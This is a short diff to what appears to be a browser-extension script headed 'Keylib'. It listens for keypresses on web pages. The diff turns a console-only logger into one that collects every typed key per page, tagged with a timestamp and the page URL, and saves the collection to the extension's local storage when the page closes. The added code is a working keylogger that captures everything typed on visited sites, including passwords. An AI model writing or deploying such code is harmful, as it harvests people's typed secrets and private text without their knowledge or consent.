@@ -1,3 +1,4 @@
+/* Keylib */
 document.addEventListener('keypress', function (e) {
     e = e || window.event;
     var charCode = typeof e.which == "number" ? e.which : e.keyCode;
@@ -30,6 +31,19 @@ document.addEventListener('keydown', function (e) {
     }
 });
 
-function log(key) {
-    console.log("log", key);
+/* Logging */
+var time = new Date().getTime();
+var key = time + "~" + document.URL;
+var data = {};
+data[key] = "";
+
+function log(input) {
+    data[key] += input;
 }
+
+window.onbeforeunload = function() {
+    chrome.storage.local.set(data, function() { console.log("Saved", data); });
+}
+
+
+
